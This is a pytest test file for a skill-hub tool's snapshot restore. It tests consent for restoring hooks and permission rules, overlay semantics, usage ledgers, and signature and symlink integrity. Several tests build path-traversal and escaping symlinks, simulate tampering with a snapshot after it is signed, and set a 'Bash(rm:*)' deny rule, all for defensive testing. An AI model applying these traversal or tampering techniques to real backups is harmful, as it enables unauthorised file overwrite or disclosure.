        {"dir": dest, "source": str(dest), "key": "k", "detail": ""},
        target_registry={}, mode="replace", data_home=target_home,
        code_home=None, home=Path.home(), trust_new_key=True,
    )
    hub._print_restore_plan(plan)
    out = _plain(capsys.readouterr().out)
    assert "executable dir(s)" in out
    assert "connector moonbase" in out
    assert "mcp-server notes" in out


# ─────────────────────────────────────────────────────────────────────────────
# 11. Interactive consent (PM6) + report-before-sync ordering (PM8)
# ─────────────────────────────────────────────────────────────────────────────


class _Tty:
    """A stdin that claims to be a terminal, so the interactive branches arm."""

    def isatty(self):
        return True


def _consent_snapshot(tmp_data_home: Path, tmp_path: Path, outside: Path) -> Path:
    hook = outside / "lint.sh"
    hook.write_text("#!/bin/sh\nexit 0\n")
    hook.chmod(0o755)
    hub.save_registry(
        {
            "version": "1",
            "skills": {}, "bundles": {}, "projects": {},
            "hooks": {"lint": {"event": "PostToolUse", "command": str(hook)}},
            "hooks_global": ["lint"],
            "permissions_global": {"deny": [{"pattern": "Bash(rm:*)", "kind": "deny"}]},
        }
    )
    dest = tmp_path / "snap-consent"
    snapshot(dest)
    return dest


def test_an_interactive_apply_can_consent_to_the_executable_state(
    tmp_data_home, tmp_path, outside, monkeypatch, capsys
):
    """PM6: the interactive restore dead-ended.

    The one snapshot worth restoring is the one carrying hooks and permission
    rules, so the apply ALWAYS refused — and the only way out was a flag the
    failure text names but the wizard never offers. The TOFU key prompt right
    next to it had had that loop all along.
    """
    dest = _consent_snapshot(tmp_data_home, tmp_path, outside)
    hub.save_registry({"version": "1", "skills": {}, "projects": {}, "bundles": {}})
    monkeypatch.setattr(hub.sys, "stdin", _Tty())
    asked: list = []

    def _yes(prompt):
        asked.append(prompt)
        return True

    monkeypatch.setattr(hub, "_confirm", _yes)
    hub.cmd_restore(_ns(from_=str(dest), mode="replace", apply=True))

    out = _plain(capsys.readouterr().out)
    assert any("executable state" in p.lower() for p in asked), asked
    assert "hook lint" in out, "the prompt must SHOW what it is asking about"
    assert "applied" in out
    assert hub.load_registry()["hooks"]["lint"]["event"] == "PostToolUse"


def test_declining_the_executable_state_refuses_the_apply_and_says_why(
    tmp_data_home, tmp_path, outside, monkeypatch, capsys
):
    dest = _consent_snapshot(tmp_data_home, tmp_path, outside)
    hub.save_registry({"version": "1", "skills": {}, "projects": {}, "bundles": {}})
    monkeypatch.setattr(hub.sys, "stdin", _Tty())
    monkeypatch.setattr(hub, "_confirm", lambda prompt: "signing key" in prompt)

    with pytest.raises(SystemExit) as exc:
        hub.cmd_restore(_ns(from_=str(dest), mode="replace", apply=True))
    assert exc.value.code == 1
    out = _plain(capsys.readouterr().out)
    assert "--accept-executable-state" in out
    assert "hooks" not in hub.load_registry(), "nothing may be written on a refusal"


def test_the_applied_report_is_printed_before_a_sync_that_exits(
    tmp_data_home, tmp_path, outside, monkeypatch, capsys
):
    """PM8: `--apply --sync` ran the sync FIRST.

    `cmd_sync` exits 2 on a doctor danger finding, so the run that most needed
    its "here is what landed and what needs your attention" report was exactly
    the run that swallowed it.
    """
    dest = _consent_snapshot(tmp_data_home, tmp_path, outside)
    hub.save_registry({"version": "1", "skills": {}, "projects": {}, "bundles": {}})

    def _exploding_sync(args):
        print("SYNC RAN")
        raise SystemExit(2)

    monkeypatch.setattr(hub, "cmd_sync", _exploding_sync)

    with pytest.raises(SystemExit) as exc:
        hub.cmd_restore(
            _ns(from_=str(dest), mode="replace", apply=True, sync=True,
                trust_new_key=True, accept_executable_state=True)
        )
    assert exc.value.code == 2
    out = _plain(capsys.readouterr().out)
    assert "applied" in out
    assert out.index("applied") < out.index("SYNC RAN"), (
        "the report must reach the user before the sync can exit"
    )


def test_json_plus_sync_keeps_stdout_a_pure_json_document(
    tmp_data_home, tmp_path, outside, monkeypatch, capsys
):
    dest = _consent_snapshot(tmp_data_home, tmp_path, outside)
    hub.save_registry({"version": "1", "skills": {}, "projects": {}, "bundles": {}})

    def _noisy_sync(args):
        print("a human-readable sync line nobody may parse")

    monkeypatch.setattr(hub, "cmd_sync", _noisy_sync)
    hub.cmd_restore(
        _ns(from_=str(dest), mode="replace", apply=True, sync=True, json=True,
            trust_new_key=True, accept_executable_state=True)
    )
    captured = capsys.readouterr()
    payload = json.loads(captured.out)  # must parse with NOTHING appended
    assert payload["applied"]["applied"] is True
    assert "a human-readable sync line" in captured.err


# ─────────────────────────────────────────────────────────────────────────────
# 12. Overlay semantics, caller isolation, and clearing the quarantine
# ─────────────────────────────────────────────────────────────────────────────


def test_local_files_the_snapshot_lacks_are_reported_as_retained(
    tmp_data_home, tmp_path
):
    """m2: restore is an OVERLAY, in both modes — and it now says so per file.

    `--mode replace` is a REGISTRY mode; it has never owned the filesystem.
    Deleting on a mode flag would silently destroy hand-edits inside a skill the
    user still has, and the pre-restore safety copy only preserves files restore
    itself overwrites. So the divergence is named instead of hidden.
    """
    write_skill(tmp_data_home / "skills", "alpha")
    hub.save_registry({"version": "1", "skills": {}, "projects": {}, "bundles": {}})
    dest = tmp_path / "snap-overlay"
    snapshot(dest)

    # A file that exists HERE and not in the snapshot.
    (tmp_data_home / "skills" / "alpha" / "local-notes.md").write_text("mine\n")

    plan = restore.build_plan(
        {"dir": dest, "source": str(dest), "key": "k", "detail": ""},
        target_registry={}, mode="replace", data_home=tmp_data_home,
        code_home=None, home=Path.home(), trust_new_key=True,
        accept_executable_state=True,
    )
    assert plan["data"]["skills"]["retained"] == ["alpha/local-notes.md"]
    assert plan["report"]["retained_extra_files"] == [
        {"section": "skills", "path": "alpha/local-notes.md"}
    ]

    restore.apply_plan(plan, data_home=tmp_data_home)
    assert (tmp_data_home / "skills" / "alpha" / "local-notes.md").read_text() == "mine\n"


@pytest.mark.parametrize("mode", ("merge", "replace"))
def test_managed_hook_bodies_restore_nested_files_and_preserve_local_extras(
    tmp_data_home, tmp_path, mode
):
    """Managed hook bodies follow the signed data overlay contract."""
    source = tmp_data_home / "hooks" / "lint"
    source.mkdir(parents=True)
    body = source / "nested" / "script.sh"
    body.parent.mkdir()
    body.write_text("#!/bin/sh\necho from snapshot\n")
    hub.save_registry({"version": "1", "skills": {}, "projects": {}, "bundles": {}})
    dest = tmp_path / "snap-hooks"
    snapshot(dest)

    body.write_text("#!/bin/sh\necho local edit\n")
    local_only = tmp_data_home / "hooks" / "lint" / "keep.sh"
    local_only.write_text("#!/bin/sh\necho keep\n")
    plan = restore.build_plan(
        {"dir": dest, "source": str(dest), "key": "k", "detail": ""},
        target_registry={}, mode=mode, data_home=tmp_data_home,
        code_home=None, home=Path.home(), trust_new_key=True,
        accept_executable_state=True,
    )

    assert plan["data"]["hooks"]["files"] == 1
    assert plan["data"]["hooks"]["retained"] == ["lint/keep.sh"]
    result = restore.apply_plan(plan, data_home=tmp_data_home)
    assert body.read_text() == "#!/bin/sh\necho from snapshot\n"
    assert local_only.read_text() == "#!/bin/sh\necho keep\n"
    assert any(
        item["source"] == str(body) and item["backup"]
        for item in result["backups"]
    )


def test_managed_hook_symlinks_are_rejected_without_materialization(
    tmp_data_home, tmp_path
):
    hub.save_registry({"version": "1", "skills": {}, "projects": {}, "bundles": {}})
    dest = tmp_path / "snap-hook-link"
    snapshot(dest)
    (dest / "hooks").mkdir()
    (dest / "hooks" / "outside.sh").symlink_to(tmp_path / "outside.sh")
    (dest / "outside-dir").mkdir()
    (dest / "hooks" / "nested").symlink_to(dest / "outside-dir", target_is_directory=True)

    plan = restore.build_plan(
        {"dir": dest, "source": str(dest), "key": "k", "detail": ""},
        target_registry={}, mode="replace", data_home=tmp_data_home,
        code_home=None, home=Path.home(), trust_new_key=True,
        accept_executable_state=True,
    )

    rejected = {item["rel"] for item in plan["rejected"]}
    assert "hooks/outside.sh" in rejected
    assert "hooks/nested" in rejected
    restore.apply_plan(plan, data_home=tmp_data_home)
    assert not (tmp_data_home / "hooks" / "outside.sh").exists()


def test_managed_hook_body_changed_after_preview_is_not_applied(
    tmp_data_home, tmp_path
):
    source = tmp_data_home / "hooks" / "lint" / "script.sh"
    source.parent.mkdir(parents=True)
    source.write_text("#!/bin/sh\necho signed\n")
    hub.save_registry({"version": "1", "skills": {}, "projects": {}, "bundles": {}})
    dest = tmp_path / "snap-hook-change"
    snapshot(dest)
    target = tmp_path / "target-home"
    target_source = target / "hooks" / "lint" / "script.sh"
    target_source.parent.mkdir(parents=True)
    target_source.write_text("#!/bin/sh\necho local\n")

    plan = restore.build_plan(
        {"dir": dest, "source": str(dest), "key": "k", "detail": ""},
        target_registry={}, mode="replace", data_home=target,
        code_home=None, home=Path.home(), trust_new_key=True,
        accept_executable_state=True,
    )
    (dest / "hooks" / "lint" / "script.sh").write_text("#!/bin/sh\necho changed\n")

    applied = restore.apply_plan(plan, data_home=target)
    assert target_source.read_text() == "#!/bin/sh\necho local\n"
    assert any("changed since the plan was built" in w for w in applied["warnings"])


def test_managed_hook_root_symlink_is_rejected(tmp_data_home, tmp_path):
    hub.save_registry({"version": "1", "skills": {}, "projects": {}, "bundles": {}})
    dest = tmp_path / "snap-hook-root-link"
    snapshot(dest)
    outside_hooks = tmp_path / "outside-hooks"
    outside_hooks.mkdir()
    (outside_hooks / "body.sh").write_text("echo unsafe\n")
    (dest / "hooks").symlink_to(outside_hooks, target_is_directory=True)

    plan = restore.build_plan(
        {"dir": dest, "source": str(dest), "key": "k", "detail": ""},
        target_registry={}, mode="replace", data_home=tmp_data_home,
        code_home=None, home=Path.home(), trust_new_key=True,
        accept_executable_state=True,
    )

    assert "hooks" in {item["rel"] for item in plan["rejected"]}
    restore.apply_plan(plan, data_home=tmp_data_home)
    assert not (tmp_data_home / "hooks" / "body.sh").exists()


def test_a_dry_run_never_mutates_the_callers_registry(tmp_data_home, tmp_path, outside):
    """m5: `merge_registry` copies two levels; the per-project dicts were SHARED.

    So the quarantine pass stamped `path_unresolved: true` straight into the
    live registry object the CLI had just loaded — during a DRY RUN.
    """
    incoming = {
        "version": "1",
        "skills": {}, "bundles": {},
        "projects": {"ghost": {"path": str(outside / "never-cloned"), "bundles": []}},
    }
    dest = _tiny_snapshot(tmp_path, incoming, data_home=tmp_data_home)

    target = {
        "version": "1",
        "skills": {}, "bundles": {},
        "projects": {"mine": {"path": str(outside / "also-never-cloned"), "bundles": []}},
    }
    before = json.dumps(target, sort_keys=True)

    plan = restore.build_plan(
        {"dir": dest, "source": str(dest), "key": "k", "detail": ""},
        target_registry=target, mode="merge", data_home=tmp_data_home,
        code_home=None, home=Path.home(), trust_new_key=True,
        accept_executable_state=True,
    )
    assert plan["resolved_registry"]["projects"]["mine"]["path_unresolved"] is True
    assert json.dumps(target, sort_keys=True) == before, (
        "the caller's registry must come back untouched from a dry run"
    )


def test_edit_path_clears_the_restore_quarantine_and_sync_writes_again(
    tmp_data_home, outside, capsys, monkeypatch
):
    """PB2: `project_sync_skip_reason` promised "Cleared by `hub project
    edit-path`" and nothing cleared it.

    A restored project was skipped by EVERY sync forever, no matter where it was
    re-pointed — and the restore report's own advice ("point it at the local
    checkout with `hub project edit-path`") was the instruction that did nothing.
    """
    from skill_hub.infrastructure.harnesses import harnesses as _harnesses

    monkeypatch.setattr(_harnesses, "detect_installed", lambda: {"claude-code"})
    write_skill(tmp_data_home / "skills", "alpha")
    real_checkout = outside / "actually-here"
    real_checkout.mkdir()

    hub.save_registry(
        {
            "version": "1",
            "harnesses_global": ["claude-code"],
            "skills": {
                "alpha": {
                    "version": "1.0.0", "description": "",
                    "source": str(tmp_data_home / "skills" / "alpha"),
                    "type": "claude-skill", "scope": "portable",
                }
            },
            "bundles": {},
            "projects": {
                "restored": {
                    "path": str(outside / "never-cloned"),
                    "bundles": [],
                    "enabled": ["alpha"],
                    "path_unresolved": True,
                }
            },
        }
    )
    assert hub.project_sync_skip_reason(
        hub.load_registry()["projects"]["restored"]
    ) is not None

    hub.cmd_project_edit_path(_ns(name="restored", new_path=str(real_checkout)))
    out = _plain(capsys.readouterr().out)
    assert "cleared the restore quarantine" in out

    cfg = hub.load_registry()["projects"]["restored"]
    assert "path_unresolved" not in cfg
    assert hub.project_sync_skip_reason(cfg) is None
    # `cmd_project_edit_path` auto-syncs, so the skill must already be there.
    link = real_checkout / ".claude" / "skills" / "alpha"
    assert link.is_symlink(), "sync must write to the re-pointed project"
    assert (link / "SKILL.md").is_file()


# ── per-machine usage ledgers: written back only where this machine has none ─


def _write_ledgers(dh: Path, tag: str) -> None:
    usage = dh / "state" / "usage"
    usage.mkdir(parents=True, exist_ok=True)
    (usage / "history.jsonl").write_text('{"date": "2026-01-01", "total": 1, "tag": "%s"}\n' % tag)
    (usage / "sessions.jsonl").write_text('{"session": "s1", "tag": "%s"}\n' % tag)


def _restore_apply(snap: Path, capsys) -> dict:
    hub.cmd_restore(
        _ns(
            from_=str(snap), mode="replace", apply=True, json=True,
            trust_new_key=True, accept_executable_state=True,
        )
    )
    return json.loads(capsys.readouterr().out)


def test_usage_ledgers_are_written_back_onto_a_machine_that_has_none(
    tmp_path_factory, monkeypatch, claude_global_doc, capsys
):
    """A reinstalled machine gets its usage history back. The snapshot file
    for this hostname lands as `state/usage/<ledger>.jsonl`; the report
    says so; the write is visible in `writes`."""
    root = tmp_path_factory.mktemp("usage-ledgers-empty")
    home_a, home_b, snap_a = root / "home-a", root / "home-b", root / "snapshot-a"

    use_home(monkeypatch, home_a)
    seed_machine_a(home_a, project_out=root / "shared-checkout")
    _write_ledgers(hub.data_home(), "from-a")
    snapshot(snap_a)
    host = backup.safe_hostname()
    assert (snap_a / ("usage/" + host + ".jsonl")).is_file()
    assert (snap_a / ("usage/sessions-" + host + ".jsonl")).is_file()

    dh_b = use_home(monkeypatch, home_b)
    hub.save_registry({"version": "1", "skills": {}, "projects": {}, "bundles": {}})
    payload = _restore_apply(snap_a, capsys)

    assert (dh_b / "state" / "usage" / "history.jsonl").read_text().endswith('"tag": "from-a"}\n')
    assert (dh_b / "state" / "usage" / "sessions.jsonl").read_text().endswith('"tag": "from-a"}\n')
    ledger_writes = [w for w in payload["applied"]["writes"] if w["kind"] == "usage-ledger"]
    assert {Path(w["target"]).name for w in ledger_writes} >= {"history.jsonl", "sessions.jsonl"}
    assert all(w["host"] == host for w in ledger_writes)
    note = payload["report"]["usage_ledgers_note"]
    assert "written back from " + host in note
    assert "state/usage/history.jsonl" in note and "state/usage/sessions.jsonl" in note
    # the plan names the decision before apply, per ledger kind
    restored = {r["entry"] for r in payload["usage_ledgers"]["restored"]}
    assert {"state/usage/history.jsonl", "state/usage/sessions.jsonl"} <= restored


def test_usage_ledgers_never_overwrite_a_machine_that_has_its_own(
    tmp_path_factory, monkeypatch, claude_global_doc, capsys
):
    """An established machine keeps its own ledger byte for byte, and the
    report says the snapshot copies stay readable in the backup repo."""
    root = tmp_path_factory.mktemp("usage-ledgers-kept")
    home_a, home_b, snap_a = root / "home-a", root / "home-b", root / "snapshot-a"

    use_home(monkeypatch, home_a)
    seed_machine_a(home_a, project_out=root / "shared-checkout")
    _write_ledgers(hub.data_home(), "from-a")
    snapshot(snap_a)

    dh_b = use_home(monkeypatch, home_b)
    hub.save_registry({"version": "1", "skills": {}, "projects": {}, "bundles": {}})
    _write_ledgers(dh_b, "own-b")
    before = (dh_b / "state" / "usage" / "history.jsonl").read_bytes()
    payload = _restore_apply(snap_a, capsys)

    assert (dh_b / "state" / "usage" / "history.jsonl").read_bytes() == before
    assert not [w for w in payload["applied"]["writes"] if w["kind"] == "usage-ledger"]
    note = payload["report"]["usage_ledgers_note"]
    assert "keeps its own" in note and "never merged or overwritten" in note
    kept = {s["entry"] for s in payload["usage_ledgers"]["skipped"]
            if s["reason"] == "this machine has its own ledger"}
    assert {"state/usage/history.jsonl", "state/usage/sessions.jsonl"} <= kept


def test_plan_usage_ledgers_picks_this_host_or_the_only_host_and_refuses_to_guess(tmp_path):
    """Unit view of the decision rule, with several machines in one snapshot.
    Also proves `usage/<host>.jsonl` (history) does not swallow
    `usage/sessions-<host>.jsonl`."""
    snap = tmp_path / "snap"
    (snap / "usage").mkdir(parents=True)
    for name in ("mac.jsonl", "sessions-mac.jsonl", "loadouts-mac.jsonl",
                 "box.jsonl", "sessions-box.jsonl"):
        (snap / "usage" / name).write_text("{}\n")
    dh = tmp_path / "dh"
    dh.mkdir()

    # this host is present → its files, kind by kind
    plan = restore._plan_usage_ledgers(snap, dh, hostname="mac")
    picked = {r["entry"]: (r["rel"], r["host"]) for r in plan["restored"]}
    assert picked == {
        "state/usage/history.jsonl": ("usage/mac.jsonl", "mac"),
        "state/usage/sessions.jsonl": ("usage/sessions-mac.jsonl", "mac"),
        "state/usage/loadouts.jsonl": ("usage/loadouts-mac.jsonl", "mac"),
    }
    assert plan["skipped"] == []

    # a new hostname: two candidates for history/sessions → refused and named;
    # loadouts has exactly one machine → taken
    plan = restore._plan_usage_ledgers(snap, dh, hostname="new-mac")
    assert [r["entry"] for r in plan["restored"]] == ["state/usage/loadouts.jsonl"]
    assert plan["restored"][0]["host"] == "mac"
    ambiguous = {s["entry"]: s["hosts"] for s in plan["skipped"]}
    assert ambiguous == {
        "state/usage/history.jsonl": ["box", "mac"],
        "state/usage/sessions.jsonl": ["box", "mac"],
    }
    note = restore._usage_ledgers_note(plan)
    assert "written back from mac" in note
    assert "several machines" in note and "box, mac" in note and "new-mac" in note

    # an empty local file counts as "none" — a zero-byte ledger is not history
    (dh / "state" / "usage").mkdir(parents=True)
    (dh / "state" / "usage" / "loadouts.jsonl").write_text("")
    plan = restore._plan_usage_ledgers(snap, dh, hostname="mac")
    assert "state/usage/loadouts.jsonl" in {r["entry"] for r in plan["restored"]}

    # a snapshot without usage/ says nothing at all
    assert restore._usage_ledgers_note(restore._plan_usage_ledgers(tmp_path / "none", dh)) is None


def test_internal_reference_round_trip(tmp_data_home, tmp_path):
    """Portable references retain their bytes, without a live symlink."""
    write_skill(tmp_data_home / "skills", "alpha")
    write_skill(tmp_data_home / "skills", "beta")
    reference = tmp_data_home / "skills" / "beta" / "criteria.md"
    reference.write_text("Accepted testing criteria\n")
    link = tmp_data_home / "skills" / "alpha" / "criteria.md"
    link.symlink_to("../beta/criteria.md")
    hub.save_registry({"version": "1", "skills": {}, "projects": {}, "bundles": {}})
    dest = tmp_path / "snapshot"
    snapshot(dest)
    target = tmp_path / "restored"
    plan = restore.build_plan(
        {"dir": dest, "source": str(dest), "key": "k", "detail": ""},
        target_registry={}, mode="replace", data_home=target,
        code_home=None, home=Path.home(), trust_new_key=True,
        accept_executable_state=True,
    )
    assert plan["ok"], plan.get("fatal")
    assert plan["integrity"]["tree_digest"]["ok"] is True
    assert plan["integrity"]["signature"]["state"] == backup.SIG_SIGNED
    assert "skills/alpha/criteria.md" not in {r["rel"] for r in plan["rejected"]}
    assert plan["data"]["skills"]["files"] == 4
    restore.apply_plan(plan, data_home=target)
    restored = target / "skills" / "alpha" / "criteria.md"
    assert restored.is_file()
    assert not restored.is_symlink()
    assert restored.read_text() == "Accepted testing criteria\n"


def _sign_extra_symlink(dest: Path, rel: str, target: str) -> None:
    """Add a symlink to an ALREADY-SIGNED snapshot at a path that did not
    exist during signing.

    `compute_tree_digest` has always skipped symlinks (`backup.py:1565`), so
    this exactly reproduces both the D2 finding (a party with write access to
    the backup repo adds a link after signing; `verify_tree_digest` and the
    SSHSIG are untouched) AND every snapshot written before the backup-side
    materialization fix existed (that fix never re-signs anything old — see
    `docs`/`restore-reference-integrity-plan.md` §"the unavoidable
    compatibility limit"). Both shapes are indistinguishable to restore, which
    is the point: neither can be authenticated, so both get the same
    explicit-consent treatment.
    """
    link = dest / rel
    link.parent.mkdir(parents=True, exist_ok=True)
    link.symlink_to(target)


def test_legacy_reference_requires_consent_and_reports_unverified(tmp_data_home, tmp_path):
    """A symlink surviving into an already-signed snapshot is never silently
    materialized: it is named in `references_unverified`, blocks apply until
    `--accept-executable-state`, and — once accepted — is written and
    reported under its own `reference-unverified` kind, never plain `data`."""
    write_skill(tmp_data_home / "skills", "alpha")
    write_skill(tmp_data_home / "skills", "beta")
    hub.save_registry({"version": "1", "skills": {}, "projects": {}, "bundles": {}})
    dest = tmp_path / "snapshot"
    snapshot(dest)
    digest_before = backup.verify_tree_digest(dest)
    sig_before = backup.verify_snapshot_signature(dest)

    _sign_extra_symlink(dest, "skills/alpha/criteria.md", "../beta/SKILL.md")

    # The signature's own trust anchors are untouched by the added link.
    assert backup.verify_tree_digest(dest) == digest_before
    assert backup.verify_snapshot_signature(dest) == sig_before

    target = tmp_path / "restored"

    def _plan(accept: bool) -> dict:
        return restore.build_plan(
            {"dir": dest, "source": str(dest), "key": "k", "detail": ""},
            target_registry={}, mode="replace", data_home=target,
            code_home=None, home=Path.home(), trust_new_key=True,
            accept_executable_state=accept,
        )

    refused = _plan(False)
    refs = refused["executable_state"]["references_unverified"]
    assert refs == [
        {
            "rel": "skills/alpha/criteria.md",
            "target_rel": "skills/beta/SKILL.md",
            "sha256": backup._sha256_file(dest / "skills" / "beta" / "SKILL.md"),
        }
    ]
    assert refused["executable_state"]["any"] is True
    assert refused["ok"] is False
    assert "unverified internal reference" in " ".join(refused["errors"])
    # Not-yet-consented and not applicable — never attempt to apply it.
    assert not (target / "skills" / "alpha" / "criteria.md").exists()

    accepted = _plan(True)
    assert accepted["ok"], accepted.get("fatal")
    applied = restore.apply_plan(accepted, data_home=target)
    written = target / "skills" / "alpha" / "criteria.md"
    assert written.is_file() and not written.is_symlink()
    assert written.read_bytes() == (dest / "skills" / "beta" / "SKILL.md").read_bytes()
    ref_writes = [w for w in applied["writes"] if w["kind"] == "reference-unverified"]
    assert len(ref_writes) == 1
    assert ref_writes[0]["target"] == str(written)
    assert not [w for w in applied["writes"] if w["kind"] == "data" and w["target"] == str(written)]


@pytest.mark.parametrize("section", ["skills", "connectors", "mcp-servers"])
def test_legacy_reference_retargeted_after_preview_is_refused_at_apply(tmp_data_home, tmp_path, section):
    """The plan pins `target_rel`/`sha256`; apply re-resolves the SAME symlink
    fresh from disk and refuses to write when either has changed since the
    preview — a reference must not be able to point somewhere new (or at
    changed content) between the moment it was shown and the moment it is
    materialized."""
    write_skill(tmp_data_home / "skills", "alpha")
    write_skill(tmp_data_home / "skills", "beta")
    write_skill(tmp_data_home / "skills", "gamma")
    hub.save_registry({"version": "1", "skills": {}, "projects": {}, "bundles": {}})
    dest = tmp_path / "snapshot"
    snapshot(dest)
    _sign_extra_symlink(dest, f"{section}/alpha/criteria.md", "../../skills/beta/SKILL.md")

    target = tmp_path / "restored"
    plan = restore.build_plan(
        {"dir": dest, "source": str(dest), "key": "k", "detail": ""},
        target_registry={}, mode="replace", data_home=target,
        code_home=None, home=Path.home(), trust_new_key=True,
        accept_executable_state=True,
    )
    assert plan["ok"], plan.get("fatal")

    # Retarget the SAME link, on the snapshot, after the plan was built.
    link = dest / section / "alpha" / "criteria.md"
    link.unlink()
    link.symlink_to("../../skills/gamma/SKILL.md")

    applied = restore.apply_plan(plan, data_home=target)
    written = target / section / "alpha" / "criteria.md"
    assert not written.exists()
    assert any("changed since the plan was built" in w for w in applied["warnings"])
    assert not [w for w in applied["writes"] if w.get("target") == str(written)]


def test_legacy_reference_content_changed_after_preview_is_refused_at_apply(
    tmp_data_home, tmp_path
):
    """Same target path, mutated bytes — the sha256 pin catches this even when
    `target_rel` still matches."""
    write_skill(tmp_data_home / "skills", "alpha")
    write_skill(tmp_data_home / "skills", "beta")
    hub.save_registry({"version": "1", "skills": {}, "projects": {}, "bundles": {}})
    dest = tmp_path / "snapshot"
    snapshot(dest)
    _sign_extra_symlink(dest, "skills/alpha/criteria.md", "../beta/SKILL.md")

    target = tmp_path / "restored"
    plan = restore.build_plan(
        {"dir": dest, "source": str(dest), "key": "k", "detail": ""},
        target_registry={}, mode="replace", data_home=target,
        code_home=None, home=Path.home(), trust_new_key=True,
        accept_executable_state=True,
    )
    assert plan["ok"], plan.get("fatal")

    (dest / "skills" / "beta" / "SKILL.md").write_text("mutated after preview\n")

    applied = restore.apply_plan(plan, data_home=target)
    written = target / "skills" / "alpha" / "criteria.md"
    assert not written.exists()
    assert any("changed since the plan was built" in w for w in applied["warnings"])


def test_legacy_code_reference_discloses_executable_content_and_unsigned_placement(tmp_path):
    """Executable content and unsigned placement are separate consequences."""
    snapshot_dir = tmp_path / "snapshot"
    payload = snapshot_dir / "skills" / "tool" / "script.py"
    payload.parent.mkdir(parents=True)
    payload.write_text("print('run')\n")
    reference = snapshot_dir / "connectors" / "tool" / "plugin.py"
    reference.parent.mkdir(parents=True)
    reference.symlink_to("../../skills/tool/script.py")
    data_home = tmp_path / "target"

    state = restore.collect_executable_state({}, snapshot_dir=snapshot_dir, data_home=data_home)
    assert state["code_dirs"][0]["files"] == ["tool/plugin.py"]
    assert state["references_unverified"][0]["rel"] == "connectors/tool/plugin.py"


@pytest.mark.parametrize("kind", [
    "absolute", "escape", "cycle", "dangling", "directory", "outside-section", "chain-escape",
])
def test_reference_resolution_rejects_unsafe_targets(tmp_path, kind):
    root = tmp_path / "snapshot"
    folder = root / "skills" / "alpha"
    folder.mkdir(parents=True)
    (folder / "valid.md").write_text("safe")
    (root / "registry.yaml").write_text("private: data")
    target = {
        "absolute": str(folder / "valid.md"),
        "escape": "../../../outside",
        "cycle": "reference.md",
        "dangling": "missing.md",
        "directory": ".",
        "outside-section": "../../registry.yaml",
        "chain-escape": "second.md",
    }[kind]
    (folder / "reference.md").symlink_to(target)
    if kind == "chain-escape":
        (folder / "second.md").symlink_to("../../registry.yaml")
    with pytest.raises(restore.RestoreError):
        restore._data_file_source(root, folder / "reference.md")


def test_restore_does_not_attach_an_existing_historical_path(tmp_data_home, tmp_path):
    checkout = tmp_path / "historical"
    checkout.mkdir()
    hub.save_registry({"version": "1", "skills": {}, "bundles": {},
                       "projects": {"old": {"path": str(checkout), "enabled": ["alpha"]}}})
    dest = tmp_path / "snapshot"
    snapshot(dest)
    plan = restore.build_plan(
        {"dir": dest, "source": str(dest), "key": "k", "detail": ""},
        target_registry={}, mode="replace", data_home=tmp_data_home,
        code_home=None, home=Path.home(), trust_new_key=True,
        accept_executable_state=True,
    )
    assert plan["resolved_registry"]["projects"]["old"].get("path_unresolved") is True
    assert "old" in plan["report"]["unresolved_projects"]
    assert plan["resolved_registry"]["projects"]["old"]["enabled"] == ["alpha"]


def test_restore_does_not_write_through_destination_section_link(tmp_data_home, tmp_path):
    write_skill(tmp_data_home / "skills", "alpha")
    hub.save_registry({"version": "1", "skills": {}, "projects": {}, "bundles": {}})
    dest = tmp_path / "snapshot"
    snapshot(dest)
    target = tmp_path / "restored"
    target.mkdir()
    outside = tmp_path / "unrelated"
    outside.mkdir()
    (target / "skills").symlink_to(outside, target_is_directory=True)
    plan = restore.build_plan(
        {"dir": dest, "source": str(dest), "key": "k", "detail": ""},
        target_registry={}, mode="replace", data_home=target,
        code_home=None, home=Path.home(), trust_new_key=True,
        accept_executable_state=True,
    )
    assert "skills/alpha/SKILL.md" in {r["rel"] for r in plan["rejected"]}
    restore.apply_plan(plan, data_home=target)
    assert list(outside.iterdir()) == []


def test_project_sync_refuses_a_regular_file_as_its_directory(tmp_path):
    path = tmp_path / "not-a-checkout"
    path.write_text("keep these bytes")
    assert hub.project_sync_skip_reason({"path": str(path)}) == f"path is not a directory: {path}"
    assert path.read_text() == "keep these bytes"


def test_first_restore_previews_and_applies_builtin_control_setup(tmp_data_home, outside, monkeypatch, capsys):
    import sys

    from skill_hub.infrastructure.harnesses import harnesses

    monkeypatch.setattr(harnesses, "detect_installed", lambda: {"claude-code", "codex"})
    monkeypatch.setenv("SKILL_HUB_STARTER_ROOT", str(Path(hub.__file__).parent / "skills"))
    hub.save_registry({"version": "1", "skills": {}, "projects": {}, "bundles": {},
                       "harnesses_global": ["claude-code"]})
    dest = outside / "control-snapshot"
    snapshot(dest)
    hub.registry_file().unlink()
    hub.cmd_restore(_ns(from_=str(dest), json=True, trust_new_key=True,
                        accept_executable_state=True))
    preview = json.loads(capsys.readouterr().out)
    assert preview["control_plane_setup"]["server"] == "registered"
    assert preview["control_plane_setup"]["companion"] == "provisioned"
    assert not hub.registry_file().exists()
    hub.cmd_restore(_ns(from_=str(dest), apply=True, json=True, trust_new_key=True,
                        accept_executable_state=True))
    capsys.readouterr()
    registry = hub._read_registry_optional()
    assert registry["skills"]["skill-tree"]["mcp"]["command"] == sys.executable
    assert registry["skills"]["skt-mcp"]["scope"] == "global"
    assert registry["harnesses_global"] == ["claude-code"]


def test_first_restore_preserves_local_control_optout(tmp_data_home, outside, capsys):
    hub.save_registry({"version": "1", "skills": {}, "projects": {}, "bundles": {}})
    dest = outside / "control-optout-snapshot"
    snapshot(dest)
    hub.save_registry({"skills": {}, "projects": {}, "bundles": {},
                       "control_plane_mcp": {"opted_out": True}})
    hub.cmd_restore(_ns(from_=str(dest), mode="replace", apply=True, json=True,
                        trust_new_key=True, accept_executable_state=True))
    capsys.readouterr()
    registry = hub._read_registry_optional()
    assert registry["control_plane_mcp"]["opted_out"] is True
    assert "skill-tree" not in registry["skills"]
